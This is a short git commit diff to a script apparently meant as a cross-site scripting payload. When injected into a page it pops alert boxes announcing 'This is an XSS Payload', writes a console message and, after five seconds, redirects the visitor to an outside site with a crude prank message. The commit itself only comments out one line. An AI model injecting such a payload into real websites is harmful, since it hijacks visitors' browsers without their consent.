809daf5c97218b48f1f0fa137ce7c97a91f7d2fe
Assfugil <42699250+Assfugil@users.noreply.github.com>
2020-05-31 23:57:50 +0800

    whatever

--- public/scripts/livecountsedit-xss.js
+++ public/scripts/livecountsedit-xss.js
@@ -2,7 +2,7 @@ alert("This is an XSS Payload")
 alert("lmao")
 alert('You will be redirected to anime earrape in 5 seconds')
 console.log('hi')
-$('counterTital').innerHTML = 'HI LOL'
+//$('counterTitle').innerHTML = 'HI LOL'
 setTimeout(() => {
     window.location.replace('https://assfugil.github.io')
 },5000)
